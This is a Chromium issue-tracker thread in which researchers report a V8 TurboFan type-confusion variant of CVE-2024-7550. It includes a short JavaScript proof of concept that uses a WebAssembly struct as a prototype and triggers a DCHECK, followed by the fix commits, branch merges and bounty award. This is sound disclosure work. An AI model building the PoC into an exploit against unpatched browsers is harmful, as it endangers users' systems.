# invariant of cve-2024-7550

| Field | Value |
|-------|-------|
| **Issue ID** | [367818758](https://issues.chromium.org/issues/367818758) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler, Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | in...@starlabs.sg |
| **Assignee** | vi...@chromium.org |
| **Created** | 2024-09-18 |
| **Bounty** | $7,000.00 |

## Description

# report

Hi, there is a invariant bug of `|cve-2024-7550|`. The patch only fixed the maglev part, however, the patch didn't fixed turbofan part.

Here is the poc, which should trigger a DCHECK:

```
load('wasm-module-builder.js');
let builder = new WasmModuleBuilder();
let struct_type = builder.addStruct([makeField(kWasmI32, true)]);
builder.addFunction('MakeStruct', makeSig([], [kWasmExternRef])).exportFunc().addBody([kExprI32Const, 42, kGCPrefix, kExprStructNew, struct_type, kGCPrefix, kExprExternConvertAny]);
let instance = builder.instantiate();
let evil_wasm_object = instance.exports.MakeStruct();

function evil_ctor(){
}

function evil_cast_jit(evil_o){
    global_collect_node_info = evil_o;    //  [+] get nodeinfo from PropertyCellStore
    return evil_o instanceof evil_ctor; 
}

//  [+] hook its prototype chain
evil_ctor.prototype = evil_wasm_object;

%PrepareFunctionForOptimization(evil_cast_jit);
evil_cast_jit(new evil_ctor());
evil_cast_jit(new evil_ctor());
%OptimizeFunctionOnNextCall(evil_cast_jit);
evil_cast_jit(new evil_ctor());

//  [+] it shouldn't hit here...

```

If there is any cve, plz credit as @WeShotTheMoon and @Nguyen Hoang Thach of starlabs.

## Attachments

- [patch_fix.diff](attachments/patch_fix.diff) (text/x-diff, 868 B)

## Timeline

### ji...@starlabs.sg (2024-09-18)

I will use another account to report it, could we delete this case? Thx.

### ma...@google.com (2024-09-18)

I can simply set the reporter to a different email address if you prefer that?

### cl...@appspot.gserviceaccount.com (2024-09-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5424326643744768.

### ma...@google.com (2024-09-18)

victorgomes@, could you PTAL?

### cl...@appspot.gserviceaccount.com (2024-09-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5169778024972288.

### ma...@google.com (2024-09-18)

(Setting labels provisionally to clear this issue from the security triage queue)

### ji...@starlabs.sg (2024-09-19)

If u think it is ok, I guess delete the case will be better. because our team want to use a more official way.

### ma...@google.com (2024-09-19)

This issue is already triaged and waiting for a code owner to take a look. I'm afraid deleting and recreating this report would cause unnecessary churn and delay in addressing this issue, which we want to avoid. I'm happy to change report ownership, attribution details etc per your input though.

### ji...@starlabs.sg (2024-09-19)

Hi, thanks for your reply. plz help me change the ownership to be `|info@starlabs.sg|`. Thank u very much.

And I need to correct the credit information again.

> If there is any cve, plz credit as `@WeShotTheMoon` and `@Nguyen Hoang Thach` of starlabs.

### pe...@google.com (2024-09-19)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-09-19)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ma...@google.com (2024-09-19)

I have moved you to CC and changed the owner/reporter as directed. Also updated the credit information in the original report.

### cl...@appspot.gserviceaccount.com (2024-09-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4950819250044928.

### ma...@google.com (2024-09-20)

(Retrying the CF test case with `wasm-module-builder.js` inlined, hoping that works!?)

### ji...@starlabs.sg (2024-09-20)

Thx for your help. I have build a simple quickly fix based on the original patch fix. It should be work.

### 24...@project.gserviceaccount.com (2024-09-20)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2024-09-20)

Detailed Report: https://clusterfuzz.com/testcase?key=4950819250044928

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  IsJSObject() in heap-refs.cc
  v8::internal::compiler::ObjectRef::AsJSObject
  v8::internal::compiler::JSNativeContextSpecialization::InferHasInPrototypeChain
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=89971:89972

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4950819250044928

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ap...@google.com (2024-10-02)

Project: v8/v8  

Branch: main  

Author: Victor Gomes <[victorgomes@chromium.org](mailto:victorgomes@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5901846>

[turbofan] Consider WasmStruct in InferHasInPrototypeChain

---


Expand for full commit details
```
[turbofan] Consider WasmStruct in InferHasInPrototypeChain

Drive-by: add some CHECKs in not _clearly_ safe uses of AsJSObject
to turn possible vulnerablities into crashes.

Fixed: 367818758
Change-Id: Ib0464658152ce87141fa137dc6562f17b84bb6be
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5901846
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Auto-Submit: Victor Gomes <victorgomes@chromium.org>
Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
Cr-Commit-Position: refs/heads/main@{#96386}

```

---

Files:

- M `src/compiler/access-info.cc`
- M `src/compiler/heap-refs.cc`
- M `src/compiler/js-native-context-specialization.cc`
- A `test/mjsunit/wasm/regress-367818758.js`

---

Hash: 81155a8f3b20fbfc7e36c2419f5326f1d0ad7d75  

Date:  Wed Oct 02 10:59:42 2024


---

### ji...@starlabs.sg (2024-10-02)

Hi, [victorgomes@chromium.org](mailto:victorgomes@chromium.org).

If I don't misunderstand anything. there is a typo error at <https://chromium-review.googlesource.com/5901846> .

The last line u write is:

```
%OptimizeFunctionOnNextCall(evil_cast_jit);
evil_cast_jit();

```

It should be :

```
%OptimizeFunctionOnNextCall(evil_cast_jit);
evil_cast_jit(new evil_ctor());

```

Thx.

### vi...@chromium.org (2024-10-02)

Hi jinlin, 

The argument is irrelevant. This is why ClusterFuzz removed it from the test case. And I copied the test from CF.

OptimizeFunctionOnNextCall will force the compilation of evil_cast_jit in the next call, no matter the argument
The DCHECK will hit during compilation.

Note that evil_cast_jit might deopt due to unexpected input arguments. But that's okay.

Cheers.

### ji...@starlabs.sg (2024-10-02)

Hi, [victorgomes@chromium.org](mailto:victorgomes@chromium.org).

Thx for your reply. I get it!

### pe...@google.com (2024-10-02)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M128. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M129. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M130. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### pe...@google.com (2024-10-03)

Merge review required: M130 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), gmpritchard (ChromeOS), danielyip (Desktop)

### pe...@google.com (2024-10-03)

Merge review required: M129 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), matthewjoseph (ChromeOS), srinivassista (Desktop)

### pe...@google.com (2024-10-03)

Merge review required: M128 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), obenedict (ChromeOS), pbommana (Desktop)

### am...@google.com (2024-10-04)

<https://crrev.com/c/5901846> approved for merges -- please merge to 13.0 and 12.9 at your earliest convenience so this fix can be included in the next respective updates

There are no further releases of M128 Extended Stable planned so I've removed that from the approvals.

### ap...@google.com (2024-10-07)

Project: v8/v8  

Branch: refs/branch-heads/13.0  

Author: Victor Gomes <[victorgomes@chromium.org](mailto:victorgomes@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5907897>

Merged: [turbofan] Consider WasmStruct in InferHasInPrototypeChain

---


Expand for full commit details
```
Merged: [turbofan] Consider WasmStruct in InferHasInPrototypeChain

Drive-by: add some CHECKs in not _clearly_ safe uses of AsJSObject
to turn possible vulnerablities into crashes.

Fixed: 367818758

(cherry picked from commit 81155a8f3b20fbfc7e36c2419f5326f1d0ad7d75)

Change-Id: Ib584877812a061056519231920eef915dc87cd58
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5907897
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Victor Gomes <victorgomes@chromium.org>
Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
Auto-Submit: Victor Gomes <victorgomes@chromium.org>
Cr-Commit-Position: refs/branch-heads/13.0@{#29}
Cr-Branched-From: 4be854bd71ea878a25b236a27afcecffa2e29360-refs/heads/13.0.245@{#1}
Cr-Branched-From: 1f5183f7ad6cca21029fd60653d075730c644432-refs/heads/main@{#96103}

```

---

Files:

- M `src/compiler/access-info.cc`
- M `src/compiler/heap-refs.cc`
- M `src/compiler/js-native-context-specialization.cc`
- A `test/mjsunit/wasm/regress-367818758.js`

---

Hash: 3de737568867771b01fd7e25d101085548175972  

Date:  Wed Oct 02 10:59:42 2024


---

### ap...@google.com (2024-10-07)

Project: v8/v8  

Branch: refs/branch-heads/12.9  

Author: Victor Gomes <[victorgomes@chromium.org](mailto:victorgomes@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5907898>

Merged: [turbofan] Consider WasmStruct in InferHasInPrototypeChain

---


Expand for full commit details
```
Merged: [turbofan] Consider WasmStruct in InferHasInPrototypeChain

Drive-by: add some CHECKs in not _clearly_ safe uses of AsJSObject
to turn possible vulnerablities into crashes.

Fixed: 367818758

(cherry picked from commit 81155a8f3b20fbfc7e36c2419f5326f1d0ad7d75)

Change-Id: I1e4d197fc0c85898760d1d1f374bccc2a778e0eb
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5907898
Auto-Submit: Victor Gomes <victorgomes@chromium.org>
Commit-Queue: Victor Gomes <victorgomes@chromium.org>
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
Cr-Commit-Position: refs/branch-heads/12.9@{#53}
Cr-Branched-From: 64a21d7ad7fca1ddc73a9264132f703f35000b69-refs/heads/12.9.202@{#1}
Cr-Branched-From: da4200b2cfe6eb1ad73c457ed27cf5b7ff32614f-refs/heads/main@{#95679}

```

---

Files:

- M `src/compiler/access-info.cc`
- M `src/compiler/heap-refs.cc`
- M `src/compiler/js-native-context-specialization.cc`
- A `test/mjsunit/wasm/regress-367818758.js`

---

Hash: 10271279ce799a5088b349834b038c4d8e49eaca  

Date:  Wed Oct 02 10:59:42 2024


---

### pe...@google.com (2024-10-07)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### sp...@google.com (2024-10-09)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
report of memory corruption in a sandboxed process / the renderer


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-10-09)

Congratulations starlab team! Thank you for your efforts and reporting this issue to us -- nice work!

### pe...@google.com (2024-10-11)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2024-10-11)

1. https://chromium-review.googlesource.com/c/v8/v8/+/5915174
2. Low, no conflicts
3. 129, 130
4. Yes

### ap...@google.com (2024-10-24)

Project: v8/v8  

Branch: refs/branch-heads/12.6  

Author: Victor Gomes <[victorgomes@chromium.org](mailto:victorgomes@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5915174>

[M126-LTS][turbofan] Consider WasmStruct in InferHasInPrototypeChain

---


Expand for full commit details
```
[M126-LTS][turbofan] Consider WasmStruct in InferHasInPrototypeChain 
 
Drive-by: add some CHECKs in not _clearly_ safe uses of AsJSObject 
to turn possible vulnerablities into crashes. 
 
(cherry picked from commit 81155a8f3b20fbfc7e36c2419f5326f1d0ad7d75) 
 
Fixed: 367818758 
Change-Id: Ib0464658152ce87141fa137dc6562f17b84bb6be 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5901846 
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org> 
Auto-Submit: Victor Gomes <victorgomes@chromium.org> 
Commit-Queue: Nico Hartmann <nicohartmann@chromium.org> 
Cr-Original-Commit-Position: refs/heads/main@{#96386} 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5915174 
Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
Cr-Commit-Position: refs/branch-heads/12.6@{#76} 
Cr-Branched-From: 3c9fa12db3183a6f4ea53d2675adb66ea1194529-refs/heads/12.6.228@{#2} 
Cr-Branched-From: 981bb15ba4dbf9e2381dfc94ec2c4af0b9c6a0b6-refs/heads/main@{#93835}

```

---

Files:

- M `src/compiler/access-info.cc`
- M `src/compiler/heap-refs.cc`
- M `src/compiler/js-native-context-specialization.cc`
- A `test/mjsunit/wasm/regress-367818758.js`

---

Hash: 6e1cc25a916c24d2f89a853a3e2215a4b88b053a  

Date:  Wed Oct 02 10:59:42 2024


---

### pe...@google.com (2025-01-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/367818758)*
